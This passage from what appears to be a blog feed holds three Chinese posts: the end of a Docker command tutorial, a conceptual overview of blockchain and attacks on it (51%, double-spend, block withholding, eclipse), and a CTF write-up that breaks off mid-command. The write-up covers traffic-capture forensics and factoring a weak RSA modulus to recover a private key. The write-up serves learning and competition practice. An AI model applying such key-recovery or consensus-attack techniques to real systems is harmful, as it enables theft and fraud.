环境等等。但这个沙盒默认是不会运行任何程序的。你需要在沙盒中运行一个进程来启动某一个容器。这个进程是该容器的唯一进程，所以当该进程结束的时候，容器也会完全的停止。、</p><p>docker run命令有两个参数，一个是镜像名，一个是要在镜像中运行的命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run hello-world </span><br><span class="line">docker run learn&#x2F;tutorial echo &quot;hello,V0W&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/IkLg24bhfd.png?imageslim" alt="mark"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/3kGg0fj02H.png?imageslim" alt="mark"></p><h2 id="在docker容器中安装新的程序"><a href="#在docker容器中安装新的程序" class="headerlink" title="在docker容器中安装新的程序"></a>在docker容器中安装新的程序</h2><p>下一步我们要做的事情是在容器里面安装一个简单的程序(ping)。我们之前下载的tutorial镜像是基于ubuntu的，所以你可以使用ubuntu的apt-get命令来安装ping程序：<strong>apt-get install -y ping</strong>。</p><p>备注：apt-get 命令执行完毕之后，容器就会停止，但对容器的改动不会丢失。</p><p>在执行apt-get 命令的时候，要带上-y参数。如果不指定-y参数的话，apt-get命令会进入交互模式，需要用户输入命令来进行确认，但在docker环境中是无法响应这种交互的。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/c5dlbA9EC6.png?imageslim" alt="mark"></p><h2 id="保存对容器的修改"><a href="#保存对容器的修改" class="headerlink" title="保存对容器的修改"></a>保存对容器的修改</h2><p>当你对某一个容器做了修改之后（通过在容器中运行某一个命令），可以把对容器的修改保存下来，这样下次可以从保存后的最新状态运行该容器。docker中保存状态的过程称之为committing，它保存的新旧状态之间的区别，从而产生一个新的版本。类似于存取快照。</p><p>首先使用 <code>docker ps -l(查看最后一次修改docker的id)</code>或者<code>docker ps -a（查看全部的docker的id）</code>命令获得安装完ping命令之后容器的id。然后把这个镜像保存为learn/ping。</p><ol><li><p>运行docker commit，可以查看该命令的参数列表。</p></li><li><p>你需要指定要提交保存容器的ID。</p></li><li><p>无需拷贝完整的id，通常来讲最开始的三至四个字母即可区分。</p></li></ol><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/DB2giLd0h4.png?imageslim" alt="mark"></p><p><strong>之后可以运行新的镜像</strong></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/HEJbG641FG.png?imageslim" alt="mark"></p><h2 id="检查运行的镜像"><a href="#检查运行的镜像" class="headerlink" title="检查运行的镜像"></a>检查运行的镜像</h2><p>使用docker ps命令可以查看所有正在运行中的容器列表，使用docker inspect命令我们可以查看更详细的关于某一个容器的信息。</p><p>可以使用镜像id的前面部分，不需要完整的id。</p><p>正确的命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker inspect efes(docker id)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/mJ0Ll3mJEC.png?imageslim" alt="mark"></p><p>其实我也看不太懂这个容器的详细信息==、</p><h2 id="发布自己的docker镜像"><a href="#发布自己的docker镜像" class="headerlink" title="发布自己的docker镜像"></a>发布自己的docker镜像</h2><ol><li><p><code>docker images</code>命令可以列出所有安装过的镜像。</p></li><li><p><code>docker push</code>命令可以将某一个镜像发布到官方网站。</p></li><li><p>你只能将镜像发布到自己的空间下面。</p></li></ol><h2 id="kill容器进程-amp-删除容器"><a href="#kill容器进程-amp-删除容器" class="headerlink" title="kill容器进程&amp;删除容器"></a>kill容器进程&amp;删除容器</h2><p><strong>docker kill:杀掉一个运行中的容器。</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker kill [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure><ul><li>-s :向容器发送一个信号</li></ul><p><strong>eg:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker kill -s KILL mynginx</span><br></pre></td></tr></table></figure><p><strong>docker rm：删除一个或多少容器</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker rm [OPTIONS] CONTAINER [CONTAINER...]</span><br></pre></td></tr></table></figure><ul><li>-f :通过SIGKILL信号强制删除一个运行中的容器</li><li>-l :移除容器间的网络连接，而非容器本身</li><li>-v :-v 删除与容器关联的卷</li></ul><p><strong>docker rmi:</strong> <strong>删除本地一个或多少镜像</strong>。</p><p>docker rmi [OPTIONS] IMAGE [IMAGE…]</p><ul><li><p>-f :强制删除；</p></li><li><p>–no-prune :不移除该镜像的过程镜像，默认移除；</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180921/dFFka1ILej.png?imageslim" alt="mark"></p></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><p><a href="http://www.docker.org.cn/book/docker/docker-getting-started-14.html">Docker入门教程</a></p></li><li><p><a href="https://docs.docker.com/">Docker官方英文文档</a></p></li><li><p><a href="https://bbs.ichunqiu.com/thread-42049-1-1.html">【文章】十分钟让你的Windows10畅玩Docker</a></p></li><li><p><a href="https://bbs.ichunqiu.com/thread-43845-1-1.html">【文章】dockers常见命令解析</a></p></li><li><p><a href="https://www.cnblogs.com/xiadongqing/p/6144053.html">docker常用命令</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 系统与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链基础与安全初探</title>
      <link href="/2018/09/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2/"/>
      <url>/2018/09/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%AE%89%E5%85%A8%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>DDCTF出过一道关于区块链的题目，并且近年来也是非常的火，但是一直没有用心研究过，之前表哥们开课了解到一些概念，最近又看了些书，算是有个大概的了解，于是写下这篇总结。</p><p>但是区块链和比特币博大精深，更多内容还需要更多的学习和研究。由于本人实在很菜，对区块链了解实在甚少，如果路过的大佬发现本文如果有所谬误，还请通过右侧的DaoVoice或者关于页面的联系方式联系我进行修改。</p><h1 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h1><p>区块链的概念首次在2008年末由中本聪（Satoshi Nakamoto）发表在比特币论坛中的论文《Bitcoin: A Peer-to-Peer Electronic Cash System》提出。 论文中区块链技术是构建比特币数据结构与交易信息加密传输的基础技术，该技术实现了比特币的挖矿与交易。 </p><p>区块链是一种支持比特币运行的底层技术。 2009年1月3日，中本聪在位于芬兰赫尔辛基的一个小型服务器上挖出了比特币的第一个区块——创世区块（Genesis Block），并获得了首批“挖矿”奖励——50个比特币。</p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="区块链定义"><a href="#区块链定义" class="headerlink" title="区块链定义"></a>区块链定义</h2><blockquote><p>区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式。所谓共识机制是区块链系统中实现不同节点之间建立信任、获取权益的数学算法 。<br>区块链（Blockchain）是比特币的一个重要概念，它本质上是一个去中介化的数据库，同时作为比特币的底层技术。区块链是一串使用密码学方法相关联产生的数据块，每一个数据块中包含了一次比特币网络交易的信息，用于验证其信息的有效性（防伪）和生成下一个区块。</p><p>——来自百度百科</p></blockquote><ul><li><p>去中心化</p><p>以往的电子交易方式是以银行为中心的，客户为边缘节点，无论转账还是消费，都是先把钱给银行。银行记账，之后电子转账给其他节点。但是区块链没有这样一个中心，都直接是区块链用户给用户，P2P形式。</p><p><img src="http://ww1.sinaimg.cn/large/b12bdb25ly1furtky06anj219m0k7n5h.jpg"></p></li><li><p>分布式： 每个人都可以架设服务器成为区块链的一个节点</p></li><li><p>数据库： 区块链是存储数据的</p></li></ul><h2 id="基本特征"><a href="#基本特征" class="headerlink" title="基本特征"></a>基本特征</h2><ul><li>区块链是一种<strong>去中心化</strong>的<strong>分布式</strong>数据库。</li></ul><ul><li><p>开放性</p><p>系统是开放的，除了交易各方的私有信息被加密外，区块链的数据对所有人公开，任何人都可以通过公开的接口查询区块链数据和开发相关应用，因此整个系统信息高度透明。</p></li><li><p>自治性</p><p>区块链采用基于协商一致的规范和协议（比如一套公开透明的算法）使得整个系统中的所有节点能够在去信任的环境自由安全的交换数据，使得对“人”的信任改成了对机器的信任，任何人为的干预不起作用。</p></li><li><p>不可篡改</p><p>一旦信息经过验证并添加至区块链，就会永久的存储起来，除非能够同时控制住系统中超过51%的节点，否则单个节点上对数据库的修改是无效的，因此区块链的数据稳定性和可靠性极高。</p></li><li><p>匿名性</p><p>由于节点之间的交换遵循固定的算法，其数据交互是无需信任的（区块链中的程序规则会自行判断活动是否有效），因此交易对手无须通过公开身份的方式让对方自己产生信任，对信用的累积非常有帮助。</p></li></ul><h2 id="区块链的结构"><a href="#区块链的结构" class="headerlink" title="区块链的结构"></a>区块链的结构</h2><p>比特币是目前区块链技术最广泛的应用，可以通过比特币作为实例了解区块链的结构。 但比特币并不是区块链，区块链是一种技术、平台。比特币只是区块链的一个应用。</p><p> 区块链是由许多区块组成的链，每个区块由区块头和数据组成。 </p><p>区块头里有32字节的父区块哈希值，父区块的哈希值由区块头各个字段的值连在一起经哈希函数（sha256）运算后得到的哈希值，这样区块便链接在一起。 如果某一区块发生改变，那么之后的区块都必须改变，当区块足够多时，计算量是非常大的。在100个区块以后，区块链已经足够稳定。几千个区块（一个月）后的区块 链将变成确定的历史，永远不会改变。这也保证的区块链的安全性。</p><p> 比特币没有中心机构，几乎所有的完整节点都有一份公共总帐的备份，这份总帐可以被视为认证过的记录。区块链并不是由一个中心机构创造的，它 是由比特币网络中的所有节点各自独立竞争完成的。</p><p> 结构图：  </p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180919/lgB98g0fhc.png?imageslim" alt="mark"></p><p>区块头结构：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180919/mimfh0bg65.png?imageslim" alt="mark"></p><h1 id="挖矿与比特币"><a href="#挖矿与比特币" class="headerlink" title="挖矿与比特币"></a>挖矿与比特币</h1><p>想要生产下一个区块，必须计算出当前最新区块的区块头的哈希值。计算哈希值的过程便是挖矿。<br>但计算出的哈希值要小于目标值,即target。<br><code>target=targetmax/difficulty</code><br>其中<code>targetmax=0x00000000FFFF0000000000000000000000000000000000000000000000000000</code><br>difficulty即区块头中的难度目标，difficulty动态变化，控制难度，使一个新区块的产生周期为10mins<br>矿工通过遍历Nonce的值，来寻找合适的哈希值。所以也说挖矿掺杂运气成分。<br>Nonce一共32位，所以最大计算次数可以到21.47亿。</p><p>每个区块中的第一个交易是特殊的: 它为第一个采到有效区块的人创建新的比特币。</p><p>开始时为2009年1月每个区块奖励50个比特币，然后到2012年11月减 半为每个区块奖励25个比特币。之后将在2016年的某个时刻再次减半为每个新区块奖励12.5个比特币。基于这个公 式，比特币挖矿奖励以指数方式递减，直到2140年。届时所有的比特币（20,999,999,980）全部发行完毕。换句话说 在2140年之后，不会再有新的比特币产生。<br>每笔交易都可能包含一笔交易费，在2140年之后，所有的矿工收益都将由交易费构成。</p><p>挖矿主要方式是矿池挖矿，独立挖矿的风险过于庞大，几乎不可能。通过工作量证明(Nonce)分配收成。</p><h1 id="共识——最长链的选择"><a href="#共识——最长链的选择" class="headerlink" title="共识——最长链的选择"></a>共识——最长链的选择</h1><p>如果两个矿工同时算出哈希值，由于距离远近，不同的矿工看到这两个区块是有先后顺序的。通常情况下，矿工们会把自己先看到的区块复制过来，然后接着在这个区块开始新的挖矿工作。于是就出现了两个区块链：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180919/CIIKcJaELk.jpg?imageslim" alt="mark"></p><p>但由于算力不同，最终会有一条区块链比较长，当矿工发现全网有一条更长的链时，他就会抛弃他当前的链，把新的更长的链全部复制回来，在这条链的基础上继续挖矿。所有矿工都这样操作，这条链就成为了主链，分叉出来被抛弃掉的链就消失了。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180919/CIIKcJaELk.jpg?imageslim" alt="mark"></p><p>这一点是基于共识的。</p><h1 id="交易流程"><a href="#交易流程" class="headerlink" title="交易流程"></a>交易流程</h1><p>小明和小红每人有一个比特币的地址（公钥：相当于是我们银行卡的卡号 ）和一个私钥（相当于银行卡密码或者说你的签名），像这个样子：</p><blockquote><p>1JQMpgRThCJjKbs7P8Ht6x142zjPJFmZVY</p></blockquote><p>我们需要填写转账的金额和对方的比特币地址，就像我们平时用银行卡转账一样的操作，一段时间后，对方即可收到你的转账金额。</p><p>这是作为用户能感知到的，看上去和我们平时的转账交易没什么不同，只是“卡号”看起来奇怪了一点，交易时间变长了一点。</p><p>那么当你按下“转账”按钮时，背后的区块链系统到底发生了什么？</p><ol><li>使用私钥对这笔即将发生的交易进行签名</li><li>从你的客户端把你的这笔交易提交到区块链网络</li><li>由已经开启“挖矿”程序的计算机（称为矿机）把10分钟内的交易打包成一个数据块（相当于一个账本，其中就包含了小明的这笔交易）</li><li>这个数据块就是上图中的“区块主体”，而此时，这些区块主体中的交易并未生效。</li><li>那么如何使这些交易生效呢？每个区块中都有一个哈希值，通过不断哈希运算，不断哈希运算（可能是几亿次）最终找到一个比当前哈希小的值，就认为这个区块被确认。即为交易生效，这个过程就称为“挖矿”。</li><li>那谁来做这个哈希呢？全球那么多交易，如果只是一家公司的几台计算机是远远不够的。所以，比特币有“激励机制”，当一台计算机确认了一个区块，就可以奖励12.5个比特币。为了得到Money，越来越多矿工就有动力造更大更多算力的矿机来“挖矿 ”。越多的人参与挖矿的竞争，算力就越分散，比特币系统就越不可能被某一个人控制。这就形成了“双赢”的局面，对于矿工来说，想想你每天游山玩水，有一台机器每天帮你赚钱，源源不断地打到你的账户#滑稽脸。对于创造比特币的人来说，几乎不花钱一分钱就能常年安全稳定地运行一套这么牛X的系统，一样可以去游山玩水而不用担心系统的维护。</li></ol><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180919/dC3D9lHKeD.png?imageslim" alt="mark"></p><h1 id="区跨链攻击方式"><a href="#区跨链攻击方式" class="headerlink" title="区跨链攻击方式"></a>区跨链攻击方式</h1><ul><li>%51攻击</li><li>双重花费攻击</li><li>自私采矿攻击：挖到新块先不广播</li><li>算力伪造攻击：利用算法漏洞虚报算力，得到超额奖励分配</li><li>扣块攻击：私吞新区块</li><li>日蚀攻击</li></ul><p>这里我也只是参考别人的答案，更多内容待学习和补充。</p><h2 id="51-攻击"><a href="#51-攻击" class="headerlink" title="%51 攻击"></a>%51 攻击</h2><p>想实施**%51攻击**的前提条件是掌握足够多的算力，想让攻击一定成功，则需要至少51%的算力。</p><p>我们可以利用超高算力做很多事情，因为比特币是始终以最长链为主链的，抛弃非最长链。所以只要我们能掌握足够多的算力，就可以在最短的时间伪造区块，比其他人都快，从而最先确认，而将愿友谊真实的区块给挤掉。</p><p><strong>攻击过程举例</strong></p><ol><li><p>卖掉你的比特币<br>首先将你的比特币全部卖掉，举个例子，你拥有100个比特币，全部卖掉，同时提现，将钱全部放入自己的银行卡里，假设这笔交易发生在Block5中。</p></li><li><p>开始攻击<br>攻击的过程，其实就是伪造更长的区块链，从而将正确的区块“挤”出去，毕竟区块链是谁长听谁的。<br>这个时候使用你掌握的大量算力，开始从block4计算，并且忽略到自己的所有交易，重新构造后面的所有区块，利用算力优势和全网赛跑（掌握了51%的算力，你说跑步跑得过？你就说怕不怕？），很快产生N个区块，而全网产生的正常区块长度为M，当N&gt;M的时候，就会丢弃正常的区块。</p></li><li><p>攻击完成<br>在后面所有的区块中，都没有你的交易记录，那么你的比特币其实还在block4之前的区块链中记录着，也就是说，你的比特币相当于没有花出去，而你的银行卡里，已经有了100个比特币的钱。</p></li></ol><p>事实上，对于比特币这样全球无数矿池的电子货币来说，想掌握51%的算力实在是太难了，几乎是不可能的，除非一大半矿池都不想干了，不想在用这个比特世界体系。</p><p>但是，对于一些山寨币的51%攻击其实不难，因为山寨币的使用和挖矿人数较少，甚至可能两三个矿池联手就可以做到。这也是比特币比其他山寨币安全的原因。</p><h2 id="双重花费攻击"><a href="#双重花费攻击" class="headerlink" title="双重花费攻击"></a>双重花费攻击</h2><p>双花攻击其实更像是51%攻击的具体实例。</p><p><strong>双花攻击</strong>        即一笔钱花了多次。</p><p>区块链网络实现的就是价值传输，那么它首先解决的问题就是双花问题，在区块链网络中是不可能出现双花现象。</p><p><strong>双花发生的情况举例：</strong></p><p><strong>一种情况</strong>你用1个比特币进行了一次交易，在这笔交易还未被确认完成，继续进行第二次花费，通俗理解就是1个比特币被花费两次，需要在同一个区块中被验证通过。</p><p><strong>二种情况</strong>第一次交易被验证通过被记录入区块后，在该网络中有更高的算力验证出新的更长链条（分叉），在该链条中这个比特币被第二次花费，由于第二次花费的区块链条更长使第一次交易区块所在链条为无效链条导致的双花问题，即51%算力攻击问题。</p><p><strong>以上这两种情况就目前科技来说基本是不可能做到的，除非网络中51%算力都是作弊的算力</strong>。</p><h2 id="算力伪造攻击"><a href="#算力伪造攻击" class="headerlink" title="算力伪造攻击"></a>算力伪造攻击</h2><p>顾名思义，就是利用某些漏洞，虚报自己的算力，从而获得额外收益。其实，这个并不是针对比特币的攻击方式，而是测算算力的算法等的漏洞。</p><h2 id="扣块攻击"><a href="#扣块攻击" class="headerlink" title="扣块攻击"></a>扣块攻击</h2><p>扣块攻击指的是扣押你在矿池挖出的区块。</p><p>扣块攻击主要有两种。</p><p>第一种，大家都知道的芬妮攻击，目标是双花发生时所获得的财富收益。</p><p>第二种目标是对矿池造成的财产损失。一个矿工在找到区块后，可以通过保留经过验证的哈希，并且不进行广播。矿工的成本是微不足道的（拿不到本可分摊的区块奖励），但矿池的损失很大，因为整个矿池失去了获得50BTC（现在是12.5BTC）区块奖作为对矿工劳动补偿的机会。</p><p>扣块攻击最简单的形式是把它叫做芬妮攻击，是由HalFinney命名的，他也是描扣块攻击的第一人。这种攻击是一种双花攻击的变化，与0确认交易相关。</p><p>攻击者生成一个有效的块但是不会广播这个块，但是会广播交易A，交易A是指购买一个物件或者服务。商家会看到没有任何冲突的交易A并接受0确认交易。之后攻击者会广播已生成的有效块和与交易A有冲突的交易B，这时比特币网络会接受有效块并使交易A无效。</p><p>攻击的代价是非常大的，因为在攻击者生成块和完成交易A之间存在时间间隙，在此期间网络上的其他人也可以生成有效块并广播它，从而使攻击者生成的有效块变的无效。因此，只有在成功购买到商品后并且立即释放扣押的区块时，这个攻击才是有效的。比如说，购买的是软件产品的秘钥。</p><p>这种攻击的一般形式，SatoshiNakamoto在《白皮书》的第11章有提到。理论上，攻击者可以预先生成任一数量的区块，例如，商家在释放产品前需要一次确认，攻击者将在网络前预先生成两个块，并且使用双倍手续费去广播它。但是每个区块的成本呈指数上升，而且在发布购买前需要接受6次确认的验证使这种攻击只有在攻击者接近网络哈希率50%或者更高的情况下有可能发生。</p><h2 id="日食攻击"><a href="#日食攻击" class="headerlink" title="日食攻击"></a>日食攻击</h2><p>日食攻击是通过其他节点实施的网络层面攻击，这种攻击目的是阻止最新的区块信息进入到被攻击的节点，从而隔离节点。</p><p>其攻击手段为：囤积和霸占受害者的点对点连接时隙（slot，类似时间间隔的意思），将该节点保留在一个隔离的网络中，达到隔离节点的目的。</p><p>目前的比特币网络和以太坊网络已经被证实均受日食攻击影响。</p><ol><li><p>针对比特币网络的日食攻击：</p><p>攻击者可以控制足够数量的IP地址来垄断所有受害节点之间的有效连接。 然后攻击者可以征用受害者的挖掘能力，并用它来攻击区块链的一致性算法或用于“重复支付和私自挖矿”</p></li><li><p>针对以太坊的日食攻击：</p><p>攻击者可以垄断受害节点所有的输入和输出连接，从而将受害节点与网络中其他正常节点隔离开来。 然后攻击者日食攻击可以诱骗受害者查看不正确的以太网交易细节，诱骗卖家在交易其实还没有完成的情况下将物品交给给攻击者。</p><p>日食攻击还可以攻击以太坊合约，方法就是让受害节点无法看清楚区块链信息，从而延迟节点看清楚智能合约的内部计算可能用到的各个参数，导致不正确的智能合约输出，因而攻击者可以大捞一笔。</p><p>在论文中，研究者仅用2台主机就成功的发起了日食攻击，且每台主机只有一个IP地址。这说明以太坊更容易被日食攻击影响。</p></li></ol><h1 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h1><ol><li><p>比特币会分配完，那么之后的收益来源？没有收益来源还会有人记账吗?</p><p>分配完之后，收益来源基本来源于每笔交易的手续费。由于一个区块可能有多笔交易，这样算来，其手续费也是相当可观的。</p><p>另外，这个手续费的多少是由这次交易的数据量决定的而不是由交易金额决定（虽说交易金额的多少也占字节，但是差别很少）。</p></li><li><p>merkle根有什么作用？</p><p><strong>merkle根</strong>：区块中每一笔交易对应一个哈希，呈树装结构，生成的最终值（根），代表了改区块中的交易。</p></li><li><p>6次确认是什么，为什么需要？</p><p>因为每个节点最先收到的广播并不一定相同，一个节点可能收到2个节点，然后这个节点需要作出痛苦的决策，到底用哪个数据作为新节点。于是他不想做这个决策，他想，哪条链后面的节点先算出来，我就用哪条链，然而下一次有可能又有相同的问题。因此，一次交易必须经过六次这样的纠结，才能基本确定一条主链，而将其他的丢弃掉。</p></li></ol><h1 id="参考链接-amp-文档"><a href="#参考链接-amp-文档" class="headerlink" title="参考链接&amp;文档"></a>参考链接&amp;文档</h1><ul><li><p><a href="http://8btc.com/article-1915-1.html">比特币区块链的数据结构解析</a></p></li><li><p><a href="http://skysec.top/2018/04/22/DDCTF-bitcoin-51per-Attack/">一叶飘零-DDCTF-bitcoin-51%Attack</a></p></li><li><p><a href="http://www.codedq.net/blog/articles/166.html">比特币的工作流程</a></p></li><li><p><a href="https://www.jianshu.com/p/1213b3b65bdf">简书-冰山上的火焰-51%攻击</a></p></li><li><p><a href="https://www.leiphone.com/news/201805/FlIlOR4AJlrDNtIY.html">黑客是如何攻击区块链的</a></p></li><li><p><a href="https://xw.qq.com/cmsid/20180626A0M9PZ00">区块链中的日食攻击</a></p></li><li><p><a href="http://bitcoin.stackexchange.com/questions/4943/what-is-a-block-withholding-attack">what-is-a-block-withholding-attack</a></p></li><li><p><a href="https://paper.seebug.org/category/blockchain/">404实验室-区块链</a></p></li><li><p><a href="https://learnblockchain.cn/">深入浅出区块链</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第七届山东省大学生网络安全技能大赛——选拔赛WP</title>
      <link href="/2018/09/16/%E7%A7%91%E6%9D%A5%E6%9D%AF-%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9C%81%E8%B5%9B-%E9%80%89%E6%8B%94%E8%B5%9BWP/"/>
      <url>/2018/09/16/%E7%A7%91%E6%9D%A5%E6%9D%AF-%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9C%81%E8%B5%9B-%E9%80%89%E6%8B%94%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="第七届山东省大学生网络安全技能大赛——选拔赛WP"><a href="#第七届山东省大学生网络安全技能大赛——选拔赛WP" class="headerlink" title="第七届山东省大学生网络安全技能大赛——选拔赛WP"></a>第七届山东省大学生网络安全技能大赛——选拔赛WP</h1><p>题目总体来说不是很难，但是时间紧，主要还有100道选择题，比较折磨人。WP写的晚，环境关了，有些题目忘记原来叫什么名字了==、</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="流量包分析"><a href="#流量包分析" class="headerlink" title="流量包分析"></a>流量包分析</h2><p>提示说找<code>特殊的脚本文件</code></p><p>于是我尝试查找<code>php</code>和<code>.py</code></p><p>分别用下面两条过滤语句</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http contains &quot;.py&quot;</span><br><span class="line">http contains &quot;.php&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180916/D2aB698BIA.png?imageslim" alt="mark"></p><p>显然，这是一个在查看一个python脚本的内容，我们可以追踪http流看一下这个文件内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">54</span>, <span class="number">51</span>, <span class="number">55</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">99</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">53</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">100</span>, <span class="number">52</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">52</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">57</span>, <span class="number">52</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">48</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">57</span>, <span class="number">100</span>, <span class="number">49</span>, <span class="number">98</span>, <span class="number">48</span>, <span class="number">102</span>, <span class="number">125</span>]</span><br><span class="line">f_l_a_g = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">f_l_a_g += chr(i)</span><br><span class="line"><span class="keyword">print</span> f_l_a_g</span><br></pre></td></tr></table></figure><p>运行py脚本得到flag。</p><h2 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h2><p>看题目的意思要求找一个后门文件</p><p>利用下面的过滤语句：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http contains &quot;.php&quot;</span><br></pre></td></tr></table></figure><p>找到了后门文件：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180916/ka9Bi6D2kI.png?imageslim" alt="mark"></p><p>追踪http流，发现一段压缩包数据：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180916/hGHGk8Edhk.png?imageslim" alt="mark"></p><p>提取出来，winhex中写入数据，解压得到二维码，扫码得到flag。</p><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180916/51eHI2L6EA.png?imageslim" alt="mark"></p><p>得到这样的结果信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key长度：255</span><br><span class="line">模数：N &#x3D; 439AEAB34EAEE973E968EBDD11D6D3EF7302072C4BFD4F7FE2B0CF9889277F6D</span><br><span class="line">指数：e &#x3D; 65537 (0x10001)</span><br><span class="line">flagmessage: c &#x3D; 0C6B16AA9B0139542FEEEDD6AE62D6F6498206F133DCFE5F45C139B8776D18DC</span><br></pre></td></tr></table></figure><p>现在已知c, e, n, 求m</p><p>因为这个模数不算大，可以直接将n分解为p,q</p><p>转换成10进制，然后在线分解一下即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; s&#x3D;&#39;439AEAB34EAEE973E968EBDD11D6D3EF7302072C4BFD4F7FE2B0CF9889277F6D&#39;</span><br><span class="line">&gt;&gt;&gt; int(s,16)</span><br><span class="line">30578675145816634962204467309994126955968568987449100734690153203822106214253</span><br></pre></td></tr></table></figure><p><a href="http://factordb.com/index.php">在线分解</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8767867843568934765983476584376578389&lt;37&gt; ·3487583947589437589237958723892346254777&lt;40&gt;</span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line">p &#x3D; 8767867843568934765983476584376578389</span><br><span class="line">q &#x3D; 3487583947589437589237958723892346254777</span><br></pre></td></tr></table></figure><p>利用CRYPTO模块，求得私钥：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=<span class="number">8767867843568934765983476584376578389</span></span><br><span class="line">arsa.q=<span class="number">3487583947589437589237958723892346254777</span></span><br><span class="line">arsa.e=<span class="number">65537</span></span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#此处原理e*d=Fn*i+1</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">&#x27;private.pem&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>之后还是利用openssl 和私钥解密</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop# openssl</span><br><span class="line">OpenSSL&gt; rsautl -decrypt -in flag.enc -inkey 